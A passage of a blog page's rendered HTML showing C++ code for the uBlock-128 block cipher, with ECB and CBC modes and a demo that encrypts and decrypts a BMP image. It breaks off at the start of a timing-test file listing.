class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A2);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A1);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(S_Inv, state1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(S_Inv, state2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tk = _mm_loadu_si128((__m128i*)Subkey[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\tk = _mm_loadu_si128((__m128i*)(Subkey[<span class=\"number\">0</span>] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c5);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c6);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_slli_epi16(state1, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)plain, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input,<span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output,<span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Decrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_Round</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen, <span class=\"type\">int</span> cryptround)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, cryptround);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Key_Schedule</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *seedkey, <span class=\"type\">int</span> keylen, <span class=\"type\">int</span> direction, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *subkey)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   <span class=\"type\">int</span> i, j;</span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"built_in\">uBlock_128_KeySchedule</span>(seedkey);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span>(direction == <span class=\"number\">0</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">17</span>; i++)</span><br><span class=\"line\">\t   &#123;</span><br><span class=\"line\">\t\t   <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t   &#123;</span><br><span class=\"line\">\t\t\t   subkey[i * <span class=\"number\">16</span> + j] = (Subkey[i][<span class=\"number\">2</span> * j] &lt;&lt; <span class=\"number\">4</span>) ^ Subkey[i][<span class=\"number\">2</span> * j + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t   &#125;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span>(direction == <span class=\"number\">1</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">17</span>; i++)</span><br><span class=\"line\">\t   &#123;</span><br><span class=\"line\">\t\t   <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t   &#123;</span><br><span class=\"line\">\t\t\t   subkey[i * <span class=\"number\">16</span> + j] = (Subkey[<span class=\"number\">16</span> - i][<span class=\"number\">2</span> * j] &lt;&lt; <span class=\"number\">4</span>) ^ Subkey[<span class=\"number\">16</span> - i][<span class=\"number\">2</span> * j + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t   &#125;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_CBC</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g, j;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> iv[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tiv[j] ^= input[g * <span class=\"number\">16</span> + j];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(iv, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(iv, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block_CBC</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input,<span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output,<span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g, j;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> iv[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Decrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\toutput[g * <span class=\"number\">16</span> + j] ^= iv[j];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(iv, input+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_ECB</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> g;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">uBlock_128_Encrypt</span>(input + g * <span class=\"number\">16</span>, output + g * <span class=\"number\">16</span>, <span class=\"number\">16</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block_ECB</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> g;    </span><br><span class=\"line\">    <span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">uBlock_128_Decrypt</span>(input + g * <span class=\"number\">16</span>, output + g * <span class=\"number\">16</span>, <span class=\"number\">16</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> key[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0x01</span>, <span class=\"number\">0x23</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0xEF</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xDC</span>, <span class=\"number\">0xBA</span>, <span class=\"number\">0x98</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x54</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x10</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> subkey[<span class=\"number\">272</span>];</span><br><span class=\"line\">    FILE *bmpFile, *encFile, *decFile;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> header[<span class=\"number\">54</span>]; <span class=\"comment\">// BMP 文件头大小为 54 字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打开朱鹮.bmp文件</span></span><br><span class=\"line\">    bmpFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮.bmp&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;open successfully！\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bmpFile == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;open failed！\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;无法打开文件。\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取BMP文件头</span></span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(header, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">54</span>, bmpFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 创建加密文件和解密文件</span></span><br><span class=\"line\">    encFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_CBC.bmp&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\">    decFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_CBC_dec.bmp&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// CBC加密</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buffer[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> bytesRead;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((bytesRead = <span class=\"built_in\">fread</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">16</span>, bmpFile)) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 执行CBC加密操作</span></span><br><span class=\"line\">        <span class=\"built_in\">Crypt_Enc_Block_CBC</span>(buffer, bytesRead, buffer, &amp;bytesRead, key, <span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 将加密后的数据写入加密文件</span></span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), bytesRead, encFile);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 关闭加密文件</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(encFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 重新打开加密文件进行解密</span></span><br><span class=\"line\">    encFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_CBC.bmp&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (encFile == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;无法打开加密文件。\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取加密文件头</span></span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(header, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">54</span>, encFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// CBC解密</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((bytesRead = <span class=\"built_in\">fread</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">16</span>, encFile)) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 执行CBC解密操作</span></span><br><span class=\"line\">        <span class=\"built_in\">Crypt_Dec_Block_CBC</span>(buffer, bytesRead, buffer, &amp;bytesRead, key, <span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 将解密后的数据写入解密文件</span></span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), bytesRead, decFile);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 关闭所有文件</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(bmpFile);</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(encFile);</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(decFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"ublock_windows_128_128-_测试时间cpp\"><a class=\"anchor\" href=\"#ublock_windows_128_128-_测试时间cpp\">#</a> uBlock_Windows_128_128 _测试时间.cpp</h2>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span 